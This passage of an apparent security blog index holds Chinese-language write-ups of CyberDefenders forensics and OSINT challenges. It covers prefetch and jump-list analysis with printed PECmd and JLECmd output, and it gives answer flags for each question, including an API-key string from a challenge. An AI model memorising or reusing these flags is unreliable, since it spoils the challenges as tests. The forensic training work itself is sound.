BCWipeSvc C 0 6/21/2016 4:44 AM B 0 \u0026#34;C:\\Program Files (x86)\\Jetico\\BCWipe\\BCWipeSvc.exe\u0026#34; -remove C 0 6/21/2016 4:44 AM 19 0 C:\\Program Files (x86)\\Jetico\\BCWipe\\bcgpupdt.dll$Remove$C:\\Program Files (x86)\\Jetico\\BCWipe\\BCWipeTM.exe C 0 6/21/2016 4:44 AM 8000000A 0 fsh C 0 6/21/2016 4:44 AM 8000000A 0 MftWipeFilter C 0 6/21/2016 4:44 AM 7 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe C 0 6/21/2016 4:44 AM 4 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\ C 0 6/21/2016 4:44 AM 3 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\BCWipe Help.lnk C 0 6/21/2016 4:44 AM 3 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\ReadMe.lnk C 0 6/21/2016 4:44 AM 3 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\About BCWipe.lnk C 0 6/21/2016 4:44 AM 3 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\BCWipe.lnk C 0 6/21/2016 4:44 AM 3 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\Crypto Swap.lnk C 0 6/21/2016 4:44 AM 3 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\BCWipe Task Manager.lnk C 0 6/21/2016 4:44 AM 3 0 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\BCWipe\\Automatic Update.lnk C 0 6/21/2016 4:53 AM C 1 DisableReboot ::: 從這份文件中就可以看到有一個軟體叫做Crypto Swap，就是我們要找的目標\n:::spoiler Flag Flag: Crypto Swap :::\n==Q20== # What are the serial numbers of the two identified USB storage?\nRecon # 這一題也是參考2才知道要從registry中撈資訊\nExploit # 在SYSTEM/ControlSet001/Enum/USBSTOR/中就有紀錄關於USB完整的資訊 和自己電腦中比較，不知到為甚麼居然沒有USBSTOR :::spoiler Flag Flag: 07B20C03C80830A9,AAI6UXDKZDV8E9OU(serial number最後沒有\u0026amp;0這兩個字元) :::\nReference # Cyberdefenders.org Hunter Walkthrough \u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCyberdefenders.org Hunter Walkthrough\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":79,"href":"/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/","title":"CyberDefender - Hunter (Part 3)","section":"Securities","content":" CyberDefender - Hunter (Part 3) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/32 Part 1: https://hackmd.io/@SBK6401/By1BpZIf6 Part 2: https://hackmd.io/@SBK6401/HJlmeuwfT\n:::spoiler TOC [TOC] :::\nTools # JLECmd ==Q21== # One of the installed applications is a file shredder. What is the name of the application? (two words space separated)\nRecon # 承接上一題，我們已經知道BCWipe就是題目要的答案，也就是類似file shredder的工具，但前面六個字還是沒有想法，看了一下外層資料夾才發現Jetico是啥東西啊，上網查才發現是提供各種data encryption/data wiping/endpoint data protection之類的公司，所以這一題的正確答案是Jetico BCWipe\n:::spoiler Flag Flag: Jetico BCWipe :::\n==Q22== # How many prefetch files were discovered on the system?\nRecon # 就只是到/root/Windows/Prefetch/中數有多少的.pf檔案(善用排序) :::spoiler Flag Flag: 174 :::\n==Q23== # How many times was the file shredder application executed?\nRecon # 我們已經知道file shredder就是BCWipe這個軟體，那我們如果要知道這個軟體的相關資訊可以直接看prefetch file(就像Part 1 - Q9一樣)\nExploit # 從結果可以得知共執行五次 :::spoiler Result\n$ ./PECmd.exe -f BCWIPE.EXE-36F3F2DF.pf PECmd version 1.5.0.0 Author: Eric Zimmerman (saericzimmerman@gmail.com) https://github.com/EricZimmerman/PECmd Command line: -f BCWIPE.EXE-36F3F2DF.pf Keywords: temp, tmp Processing BCWIPE.EXE-36F3F2DF.pf Created on: 2023-11-02 04:55:47 Modified on: 2016-06-21 12:02:45 Last accessed on: 2023-11-02 04:55:53 Executable name: BCWIPE.EXE Hash: 36F3F2DF File size (bytes): 72,524 Version: Windows 8.0, Windows 8.1, or Windows Server 2012(R2) Run count: 5 Last run: 2016-06-21 12:02:35 Other run times: 2016-06-21 12:02:39, 2016-06-21 12:01:35, 2016-06-21 12:01:00, 2016-06-21 12:00:56 Volume information: #0: Name: \\DEVICE\\HARDDISKVOLUME2 Serial: 669B1B2A Created: 2016-06-21 09:09:24 Directories: 14 File references: 84 #1: Name: \\DEVICE\\HARDDISKVOLUMESHADOWCOPY1 Serial: 669B1B2A Created: 2016-06-21 09:09:24 Directories: 0 File references: 0 #2: Name: \\DEVICE\\HARDDISKVOLUMESHADOWCOPY2 Serial: 669B1B2A Created: 2016-06-21 09:09:24 Directories: 0 File references: 0 Directories referenced: 14 00: \\DEVICE\\HARDDISKVOLUME2\\$RECYCLE.BIN 01: \\DEVICE\\HARDDISKVOLUME2\\$RECYCLE.BIN\\S-1-5-21-2489440558-2754304563-710705792-1001 02: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86) 03: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO 04: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO\\BCWIPE 05: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO\\SHARED 06: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS 07: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\FONTS 08: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\GLOBALIZATION 09: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\GLOBALIZATION\\SORTING 10: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32 11: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\EN-US 12: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64 13: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\WINSXS\\X86_MICROSOFT.WINDOWS.COMMON-CONTROLS_6595B64144CCF1DF_6.0.9600.17031_NONE_A9EFDB8B01377EA7 Files referenced: 113 00: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\NTDLL.DLL 01: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\WOW64.DLL 02: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\WOW64WIN.DLL 03: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\WOW64CPU.DLL 04: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\KERNEL32.DLL 05: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\KERNEL32.DLL 06: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\USER32.DLL 07: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\NTDLL.DLL 08: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO\\BCWIPE\\BCWIPE.EXE (Executable: True) 09: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\KERNELBASE.DLL 10: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\LOCALE.NLS 11: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\VERSION.DLL 12: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\USER32.DLL 13: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\GDI32.DLL 14: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\COMDLG32.DLL 15: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\ADVAPI32.DLL 16: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SHELL32.DLL 17: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\MSVCRT.DLL 18: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SHLWAPI.DLL 19: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\WINSXS\\X86_MICROSOFT.WINDOWS.COMMON-CONTROLS_6595B64144CCF1DF_6.0.9600.17031_NONE_A9EFDB8B01377EA7\\COMCTL32.DLL 20: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SECHOST.DLL 21: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\RPCRT4.DLL 22: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\COMBASE.DLL 23: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SSPICLI.DLL 24: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SHCORE.DLL 25: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\CRYPTBASE.DLL 26: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\BCRYPTPRIMITIVES.DLL 27: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\IMM32.DLL 28: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\MSCTF.DLL 29: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\WINDOWSSHELL.MANIFEST 30: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO\\SHARED\\BCWIPE.DLL 31: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\OLE32.DLL 32: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\OLEAUT32.DLL 33: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SFC.DLL 34: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO\\BCWIPE\\LANGFILE2.DLL 35: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO\\BCWIPE\\LICENSE.TXT 36: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\CRYPT32.DLL 37: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\MSASN1.DLL 38: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WINTRUST.DLL 39: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\CRYPTSP.DLL 40: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\RSAENH.DLL 41: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\BCRYPT.DLL 42: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\GLOBALIZATION\\SORTING\\SORTDEFAULT.NLS 43: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\IMAGEHLP.DLL 44: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\EN-US\\CRYPT32.DLL.MUI 45: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\NCRYPT.DLL 46: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\NTASN1.DLL 47: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\GPAPI.DLL 48: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\PROFAPI.DLL 49: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\NTMARTA.DLL 50: \\DEVICE\\HARDDISKVOLUME2\\$RECYCLE.BIN\\S-1-5-21-2489440558-2754304563-710705792-1001\\DESKTOP.INI 51: \\DEVICE\\HARDDISKVOLUME2\\$RECYCLE.BIN\\S-1-5-21-2489440558-2754304563-710705792-1001\\$IJJWGAC 52: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\UXTHEME.DLL 53: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SETUPAPI.DLL 54: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\CFGMGR32.DLL 55: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\EN-US\\SETUPAPI.DLL.MUI 56: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\DWMAPI.DLL 57: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\EN-US\\USER32.DLL.MUI 58: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\FONTS\\STATICCACHE.DAT 59: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\KERNEL.APPCORE.DLL 60: \\DEVICE\\HARDDISKVOLUME2\\PROGRAM FILES (X86)\\JETICO\\SHARED\\BCWIPELIB2.DLL 61: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\FLTLIB.DLL 62: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\PSAPI.DLL 63: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\NETAPI32.DLL 64: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\MPR.DLL 65: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\NETUTILS.DLL 66: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SRVCLI.DLL 67: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WKSCLI.DLL 68: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\PROPSYS.DLL 69: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\CLBCATQ.DLL 70: \\DEVICE\\HARDDISKVOLUME2\\PROGRAMDATA\\MICROSOFT\\WINDOWS\\CACHES\\CVERSIONS.2.DB 71: \\DEVICE\\HARDDISKVOLUME2\\PROGRAMDATA\\MICROSOFT\\WINDOWS\\CACHES\\{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.VER0X0000000000000004.DB 72: \\DEVICE\\HARDDISKVOLUME2\\PROGRAMDATA\\MICROSOFT\\WINDOWS\\CACHES\\{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.VER0X0000000000000002.DB 73: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSTEM32\\EN-US\\PROPSYS.DLL.MUI 74: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\DESKTOP\\DESKTOP.INI 75: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\DOCUMENTS\\DESKTOP.INI 76: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\MUSIC\\DESKTOP.INI 77: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\PICTURES\\DESKTOP.INI 78: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\VIDEOS\\DESKTOP.INI 79: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\DOWNLOADS\\DESKTOP.INI 80: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\URLMON.DLL 81: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\IERTUTIL.DLL 82: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WININET.DLL 83: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\USERENV.DLL 84: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SECUR32.DLL 85: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\PCACLI.DLL 86: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\APPHELP.DLL 87: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\SFC_OS.DLL 88: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\DEVRTL.DLL 89: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WBEM\\WBEMPROX.DLL 90: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WS2_32.DLL 91: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WBEMCOMN.DLL 92: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\NSI.DLL 93: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WBEM\\WBEMSVC.DLL 94: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\WBEM\\FASTPROX.DLL 95: \\DEVICE\\HARDDISKVOLUME2\\$MFT 96: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\VSSAPI.DLL 97: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\VSSTRACE.DLL 98: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\DSROLE.DLL 99: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\SYSWOW64\\BCD.DLL 100: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\APPDATA\\LOCAL\\TEMP\\BCS576923DD.TMP (Keyword: True) 101: \\DEVICE\\HARDDISKVOLUMESHADOWCOPY1\\$MFT 102: \\DEVICE\\HARDDISKVOLUMESHADOWCOPY2\\$MFT 103: \\DEVICE\\HARDDISKVOLUME2\\$RECYCLE.BIN\\S-1-5-21-2489440558-2754304563-710705792-1001\\$RJJWGAC\\VKORPPVHKXUVQCVJ 104: \\DEVICE\\HARDDISKVOLUME2\\$RECYCLE.BIN\\S-1-5-21-2489440558-2754304563-710705792-1001\\SHATBBMS.DIF:??? 105: \\DEVICE\\HARDDISKVOLUME2\\~BCWIPE.TMP\\BCW-DIR-NODES\\DIR1:??? (Keyword: True) 106: \\DEVICE\\HARDDISKVOLUME2\\~BCWIPE.TMP\\BCW-DIR-NODES\\DIR2:??? (Keyword: True) 107: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER:??? 108: \\DEVICE\\HARDDISKVOLUME2\\$RECYCLE.BIN\\C7A6090EE:??? 109: \\DEVICE\\HARDDISKVOLUME2\\WINDOWS\\APPPATCH\\SYSMAIN.SDB 110: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\APPDATA\\LOCAL\\TEMP\\S64_5762C6FA.TMP (Keyword: True) 111: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\APPDATA\\LOCAL\\MICROSOFT\\WINDOWS\\CACHES\\CVERSIONS.1.DB 112: \\DEVICE\\HARDDISKVOLUME2\\USERS\\HUNTER\\APPDATA\\LOCAL\\MICROSOFT\\WINDOWS\\CACHES\\{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.VER0X0000000000000002.DB ---------- Processed BCWIPE.EXE-36F3F2DF.pf in 0.07580980 seconds ---------- ::: :::spoiler Flag Flag: 5 :::\n==Q24== # Using prefetch, determine when was the last time ZENMAP.EXE-56B17C4C.pf was executed?\nRecon # 直接看Part 1 - Q9的輸出結果就好了\n:::spoiler Flag Flag: 06/21/2016 12:08:13 PM :::\n==Q25== # A JAR file for an offensive traffic manipulation tool was executed. What is the absolute path of the file?\nRecon # 通常直覺會是到program file去看一下，不過有時候載下來的軟體可能是portable version，所以我也到downloads去看，發現唯一一個jar file就是burpsuite\n:::spoiler Flag Flag: C:\\Users\\Hunter\\Downloads\\burpsuite_free_v1.7.03.jar :::\n==Q26== # The suspect employee tried to exfiltrate data by sending it as an email attachment. What is the name of the suspected attachment?\nRecon # 用pst viewer瀏覽一下信件就知道了\n:::spoiler Flag Flag: Pictures.7z :::\n==Q27== # Shellbags shows that the employee created a folder to include all the data he will exfiltrate. What is the full path of that folder?\nRecon # 看一下pictures裡面的資料夾很明顯的Exfil就是我們的目標 :::spoiler Flag Flag: C:\\Users\\Hunter\\Pictures\\Exfil :::\n==Q28== # The user deleted two JPG files from the system and moved them to $Recycle-Bin. What is the file name that has the resolution of 1920x1200?\nRecon # 這應該是嘗試，如果刪除檔案會直接丟到recycle bin，所以可以直接到這邊去撈，不過從recycle bin撈到的檔案貌似損毀，紙看到應該是貓貓的耳朵 所以可以查看一下原圖是甚麼，我是直接從Pictures裡面的private中撈檔案 剛好檔案大小誠如題目所述\n:::spoiler Flag Flag: ws_Small_cute_kitty_1920x1200.jpg :::\n==Q29== # Provide the name of the directory where information about jump lists items (created automatically by the system) is stored?\nBackground # ChatGPT\n甚麼是windows jump list Windows Jump List（視窗跳躍清單）是微軟Windows操作系統的一個功能，它允許用戶在任務欄或開始菜單中快速訪問最近使用的文件或網站。 Jump List通常包含以下元素：\n最近打開的文件：這些是您最近打開的文件或應用程序，讓您可以快速重新訪問它們。\n固定的項目：您可以將特定文件或應用程序釘選到Jump List中，以便隨時方便訪問。\n一些應用程序還可以自定義Jump List，提供特定功能或快速操作的選項。 Jump List通常會顯示在相應應用程序的任務欄圖標上，並提供一個方便的方式來訪問最近的活動。\n請注意，某些應用程序可能會選擇不支持Jump List功能，這取決於開發人員的實現方式。\nRecon # 我直接問ChatGPT後得到以下回答:\nThe directory where information about jump list items (created automatically by the system) is stored in Windows is:\n%APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations This directory contains files that store information about recently accessed items and is used by the Jump List feature in Windows. Each file corresponds to a specific application or taskbar icon. Please note that these files are in a binary format and are not meant to be manually modified.\n:::spoiler Flag Flag: AutomaticDestinations :::\n==Q30== # Using JUMP LIST analysis, provide the full path of the application with the AppID of \u0026ldquo;aa28770954eaeaaa\u0026rdquo; used to bypass network security monitoring controls.\nRecon # 該用到新工具的時候了，下載JLECmd後可以直接查看.ms file，就是我們上一題找到的地方，在Recent/CustomDestinations的地方有這一題著重探到的aa28770954eaeaaa，export出來之後就可以開始分析\nExploit # $ ./JLECmd.exe -f aa28770954eaeaaa.customDestinations-ms JLECmd version 1.5.0.0 Author: Eric Zimmerman (saericzimmerman@gmail.com) https://github.com/EricZimmerman/JLECmd Command line: -f aa28770954eaeaaa.customDestinations-ms Processing D:\\Software\\CTF\\Misc\\JLECmd\\aa28770954eaeaaa.customDestinations-ms Source file: D:\\Software\\CTF\\Misc\\JLECmd\\aa28770954eaeaaa.customDestinations-ms --- AppId information --- AppID: aa28770954eaeaaa, Description: null --- DestList information --- Entries: 1 Entry #: 0, lnk count: 3 Rank: 1.4013E-45 --- Lnk #0 information --- Lnk target created: 2000-01-01 00:00:00 Lnk target modified: 2000-01-01 00:00:00 Lnk target accessed: 2016-06-21 10:51:23 Absolute path: Tor Browser\\Browser\\firefox.exe --- Lnk #1 information --- Lnk target created: 2000-01-01 00:00:00 Lnk target modified: 2000-01-01 00:00:00 Lnk target accessed: 2016-06-21 10:51:23 Absolute path: Tor Browser\\Browser\\firefox.exe --- Lnk #2 information --- Lnk target created: 2000-01-01 00:00:00 Lnk target modified: 2000-01-01 00:00:00 Lnk target accessed: 2016-06-21 10:51:23 Absolute path: Tor Browser\\Browser\\firefox.exe ---------- Processed D:\\Software\\CTF\\Misc\\JLECmd\\aa28770954eaeaaa.customDestinations-ms in 0.27381430 seconds ---------- 我們到了jump list的absolute path之後就可以回去翻他在哪邊，原來是在desktop :::spoiler Flag Flag: C:\\Users\\Hunter\\Desktop\\Tor Browser\\Browser\\firefox.exe :::\nReference # Cyberdefenders.org Hunter Walkthrough\n"},{"id":80,"href":"/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/","title":"CyberDefender - Intel101","section":"Securities","content":" CyberDefender - Intel101 # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/38\n:::spoiler TOC [TOC] :::\nScenario # Open-source intelligence (OSINT) exercise to practice mining and analyzing public data to produce meaningful intel when investigating external threats as a security blue team analyst. Tools\nTool # Google Lens archive.org WhoIS ==Q1== # Who is the Registrar for jameskainth.com?\nRecon # 看whois的搜尋結果 :::spoiler Flag Flag: NameCheap :::\n==Q2== # You get a phone call from this number: 855-707-7328, they were previously known by another name? (No spaces between words)\nRecon # 這一題是參考1，看truecaller的搜尋結果會發現他是Spectrum Cable的客服電話，這應該是其中一個美國電信公司，所以直接查他舊的名字就知道 :::spoiler Flag Flag: TimeWarnerCable :::\n==Q3== # What is the Zoom meeting id of the British Prime Ministers Cabinet Meeting?\nRecon # 慢慢google就會看到這個網站 :::spoiler Flag Flag: 539544323 :::\n==Q4== # What Percentage of full-time degree-seeking freshmen from the fall of 2018 re-enrolled to Champlain in the fall of 2019?\nRecon # 這一題是參考1的說明，因為現在都只有2022/2023之類的比較近一點的資訊，如果用wayback machine也沒有那麼久之前的資料，不過用wayback machine是正確的方向\n:::spoiler Flag Flag: 82.5% :::\n==Q5== # In 1998 specifically on February 12th, Champlain was planning on adding an exciting new building to its campus. Back then, it was called “The Information Commons”. Can you find a picture of what the inside would look like? Upload the sha256 hash here.\nRecon # 直覺會先用wayback machine看1998的時候，網站的變化\nExploit # wayback machine Search Informations Common 存檔並checksum :::spoiler Flag Flag: f4952b314eb15acf0eec79c954f83881c17d50d2b5922ee37e8fc5e5cd1aeac2 :::\n==Q6== # One of Champlain College\u0026rsquo;s Cyber Security Faculty got a bachelor\u0026rsquo;s degree in arts from this Ohioan university. Who was the other faculty member who studied there? (FirstName LastName - two words)\nExploit # 可以先看Cybersecurity - facaulty的東西 題目有提到有人是在Ohioan大學取得美術學士學位，這是個重點，他不是說在Ohio University而是Ohioan University，也就是只提到該間大學是在Ohio，所以要先知道是哪一間，parse過一下現任的員工後發現University of Toledo就在Ohio State 題目問的是\u0026quot;其他員工\u0026quot;也是在該間大學就讀過，而不是\u0026quot;其他cybersecurity員工\u0026quot;，代表我們要找的對象是全校所有的員工，因此可以直接在所有員工的頁面parse有這間大學的資訊頁面，最後我找到這個人，字數和hint也和題目相同 inurl:champlain.edu/academics/our-faculty intext:University of Toledo :::spoiler Flag Flag: Todd Schroeder :::\n==Q7== # In 2019 UVM’s Ichthyology Class Had to Name their fish for class. Can you find out what the last person on the public roster named their fish?\nRecon # 這一題照著1也是找不到\n:::spoiler Flag Flag: Saccopharyngiformes :::\n==Q8== # Can You Figure Out Which State This Picture Has Been Taken From? See attached photo\nExploit # 這一題我是先google map找外國的恐龍主題樂園，然後就看他的所在地try \u0026amp; error，因為答案有最後一個char的hint\n:::spoiler Flag Flag: Virginia :::\nReference # CyberDefenders Walkthrough : Intel101\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":81,"href":"/security/practice/cyberdefender/cyberdefender---krakenkeylogger/","title":"CyberDefender - KrakenKeylogger","section":"Securities","content":" CyberDefender - KrakenKeylogger # :::spoiler TOC [TOC] :::\nScenario # An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.\nThe helper\u0026rsquo;s demand for payment revealed that he was actually a threat actor. The company\u0026rsquo;s digital forensics team was called in to investigate and identify the attacker, determine the extent of the attack, and assess potential data breaches. The team must analyze the employee\u0026rsquo;s computer and communication logs to prevent similar attacks in the future.\nTools # DB Browser LECmd Timeline Explorer ==Q1== # What is the the web messaging app the employee used to talk to the attacker?\nRecon # 這一題看了超久，主要是東西都刪的很乾淨，包含Program Files / Users Download / AppData甚至是機碼的Start up Application都沒有相關的足跡，俗話說沒想法就看log，所以我就去看chrome的瀏覽紀錄，最後就找到了\nExploit # Google Chrome的artifact在.challenge\\Users\\OMEN\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\的History Flag: telegram\n==Q2== # What is the password for the protected ZIP file sent by the attacker to the employee?\nRecon # Exploit # ==Q3== # What domain did the attacker use to download the second stage of the malware?\nRecon # Exploit # ==Q4== # What is the name of the command that the attacker injected using one of the installed LOLAPPS on the machine to achieve persistence?\nRecon # Exploit # ==Q5== # What is the complete path of the malicious file that the attacker used to achieve persistence?\nRecon # Exploit # ==Q6== # What is the name of the application the attacker utilized for data exfiltration?\nRecon # Exploit # ==Q7== # What is the IP address of the attacker?\nRecon # Exploit # Reference # "},{"id":82,"href":"/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/","title":"CyberDefender - L'espion","section":"Securities","content":" CyberDefender - L\u0026rsquo;espion # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/73\n:::spoiler TOC [TOC] :::\nScenario # You, as a soc analyst, have been tasked by a client whose network was compromised and brought offline to investigate the incident and determine the attacker\u0026rsquo;s identity.\nIncident responders and digital forensic investigators are currently on the scene and have conducted a preliminary investigation. Their findings show that the attack originated from a single user account, probably, an insider.\nInvestigate the incident, find the insider, and uncover the attack actions.\nTools # Google Maps Google Image search sherlock ==Q1== # File -\u0026gt; Github.txt: What is the API key the insider added to his GitHub repositories?\nRecon # 直接在github key word search，就找到了 :::spoiler Flag Flag: aJFRaLHjMXvYZgLPwiJkroYLGRkNBW :::\n==Q2== # File -\u0026gt; Github.txt: What is the plaintext password the insider added to his GitHub repositories?\nExploit 